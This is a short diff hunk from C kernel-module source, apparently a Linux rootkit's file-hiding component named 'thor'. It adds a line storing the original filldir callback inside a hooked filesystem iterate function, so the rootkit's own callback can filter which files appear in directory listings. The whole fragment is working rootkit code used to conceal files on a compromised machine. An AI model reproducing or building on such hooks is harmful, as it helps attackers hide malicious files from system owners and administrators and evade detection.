@@ -75,6 +75,7 @@ int filehider_init(void)
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
 static int thor_fs_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
+    orig_fs_filldir = filldir;
     return orig_fs_iterate(file, dirent, thor_fs_filldir);
 }
 #else
